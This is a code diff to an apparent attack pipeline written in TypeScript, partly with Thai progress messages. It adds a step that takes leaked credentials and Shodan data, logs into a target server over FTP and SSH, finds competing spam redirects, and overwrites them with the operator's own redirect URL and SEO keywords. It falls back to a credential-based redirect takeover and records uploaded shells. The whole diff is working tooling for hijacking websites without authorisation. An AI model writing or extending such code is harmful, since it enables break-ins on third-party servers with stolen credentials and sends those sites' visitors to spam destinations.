@@ -3814,6 +3814,9 @@ export async function runUnifiedAttackPipeline(
           progress: 97,
         });
 
+        // Note: Deep Competitor Analysis runs in Phase 5.6b after LeakCheck provides creds
+
+        // ─── Standard Redirect Takeover ───
         // Collect any WP credentials found during the pipeline
         const wpCreds = discoveredCredentials.find((c: any) => c.username && c.password);
         // Collect any shell URLs from successful uploads
@@ -4222,10 +4225,86 @@ export async function runUnifiedAttackPipeline(
         loggedOnEvent({
           phase: "shellless" as any,
           step: "cred_takeover_start",
-          detail: `\u26a1 Phase 5.6b: Credential Takeover \u2014 ${validCreds.length} leaked creds + Shodan intel \u2192 FTP/SSH overwrite...`,
+          detail: `\u26a1 Phase 5.6b: Credential Takeover \u2014 ${validCreds.length} leaked creds + Shodan intel \u2192 Deep Analysis + FTP/SSH overwrite...`,
           progress: 90,
         });
 
+        // ─── Step 1: Deep Competitor Analysis via FTP/SSH ───
+        const analyzerCreds: import("./competitor-redirect-analyzer").AnalyzerCredentials = {
+          ftp: validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 21 })),
+          ssh: validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 22 })),
+        };
+
+        try {
+          const { analyzeCompetitorRedirects, overwriteCompetitorRedirects } = await import("./competitor-redirect-analyzer");
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "competitor_deep_scan",
+            detail: `\ud83d\udd2c Deep Analysis: \u0e2a\u0e41\u0e01\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e1a\u0e19 server \u0e2b\u0e32 injection points \u0e02\u0e2d\u0e07\u0e04\u0e39\u0e48\u0e41\u0e02\u0e48\u0e07...`,
+            progress: 90,
+          });
+
+          const competitorAnalysis = await Promise.race([
+            analyzeCompetitorRedirects(targetHost, analyzerCreds, (msg) => {
+              loggedOnEvent({ phase: "shellless" as any, step: "competitor_scan_progress", detail: msg, progress: 90 });
+            }),
+            new Promise<null>((resolve) => setTimeout(() => resolve(null), 45000)),
+          ]);
+
+          if (competitorAnalysis && competitorAnalysis.injectionPoints.length > 0) {
+            loggedOnEvent({
+              phase: "shellless" as any,
+              step: "competitor_found",
+              detail: `\ud83c\udfaf \u0e1e\u0e1a ${competitorAnalysis.injectionPoints.length} injection points: ${competitorAnalysis.overwriteOrder.join(", ")} \u2014 \u0e01\u0e33\u0e25\u0e31\u0e07 overwrite \u0e15\u0e23\u0e07\u0e08\u0e38\u0e14...`,
+              progress: 91,
+            });
+
+            const overwriteResults = await Promise.race([
+              overwriteCompetitorRedirects(
+                competitorAnalysis,
+                config.redirectUrl,
+                analyzerCreds,
+                targetHost,
+                config.seoKeywords,
+                (msg) => {
+                  loggedOnEvent({ phase: "shellless" as any, step: "competitor_overwrite", detail: msg, progress: 91 });
+                },
+              ),
+              new Promise<import("./competitor-redirect-analyzer").OverwriteResult[]>((resolve) => setTimeout(() => resolve([]), 60000)),
+            ]);
+
+            const overwriteSuccess = overwriteResults.filter(r => r.success);
+            if (overwriteSuccess.length > 0) {
+              loggedOnEvent({
+                phase: "shellless" as any,
+                step: "competitor_overwrite_done",
+                detail: `\u2705 Deep Overwrite \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08 ${overwriteSuccess.length}/${overwriteResults.length} \u0e08\u0e38\u0e14: ${overwriteSuccess.map(r => r.action).join(", ")}`,
+                progress: 92,
+              });
+              uploadedFiles.push({
+                url: config.targetUrl,
+                shell: shells[0] || { id: "deep_overwrite", type: "html" as any, filename: "overwrite.html", content: "", size: 0, mimeType: "text/html", headers: {} },
+                method: `deep_overwrite_${overwriteSuccess[0].action}`,
+                verified: true,
+                redirectWorks: true,
+                redirectDestinationMatch: true,
+                finalDestination: config.redirectUrl,
+                redirectChain: [],
+                httpStatus: 302,
+              });
+            }
+          }
+        } catch (analysisError: any) {
+          loggedOnEvent({
+            phase: "shellless" as any,
+            step: "competitor_analysis_error",
+            detail: `\u26a0\ufe0f Deep analysis error: ${analysisError.message}`,
+            progress: 90,
+          });
+        }
+
+        // ─── Step 2: Standard Credential Takeover (fallback if deep analysis didn't succeed) ───
+        if (!hasSuccessfulRedirect()) {
         const { executeRedirectTakeover: execTakeover } = await import("./redirect-takeover");
         const ftpCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 21 }));
         const sshCreds = validCreds.map(c => ({ host: targetHost, username: c.username, password: c.password, port: 22 }));
@@ -4269,6 +4348,7 @@ export async function runUnifiedAttackPipeline(
             progress: 90,
           });
         }
+        } // end if (!hasSuccessfulRedirect()) fallback
       }
     } catch (error: any) {
       loggedOnEvent({
